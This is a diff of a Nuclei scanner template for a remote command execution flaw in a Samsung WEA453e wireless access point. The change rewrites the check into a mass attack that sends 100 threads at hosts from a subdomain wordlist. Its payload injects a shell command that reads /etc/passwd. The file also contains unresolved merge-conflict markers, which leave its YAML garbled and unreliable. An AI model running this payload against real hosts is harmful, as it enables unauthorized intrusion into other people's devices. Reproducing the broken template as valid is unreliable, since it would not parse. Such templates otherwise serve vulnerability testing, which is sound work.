@@ -5,6 +5,7 @@ info:
   name: Samsung Wlan AP (WEA453e) RCE
   author: pikpikcu
   severity: critical
+<<<<<<< HEAD
   reference:
     - https://iryl.info/2020/11/27/exploiting-samsung-router-wlan-ap-wea453e/
 =======
@@ -19,19 +20,29 @@ info:
     cvss-score: 10.0
     cwe-id: CWE-77
 >>>>>>> 5d36d276 (add new stuff)
+=======
+  reference: https://iryl.info/2020/11/27/exploiting-samsung-router-wlan-ap-wea453e/
+>>>>>>> 18ddf72b (add new stuff)
   tags: xss,samsung,rce
 
 requests:
-  - method: POST
-    path:
-      - "{{BaseURL}}/(download)/tmp/poc.txt"
-    body: "command1=shell%3Acat /etc/passwd|dd of=/tmp/poc.txt"
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
+    raw:
+      - |
+        POST /(download)/tmp/poc.txt HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+
+        command1=shell%3Acat /etc/passwd|dd of=/tmp/poc.txt
     matchers-condition: and
     matchers:
       - type: regex
         regex:
-          - "root:.*:0:0:"
+          - "root:.*:0:0"
           - "bin:.*:1:1"
         part: body
 
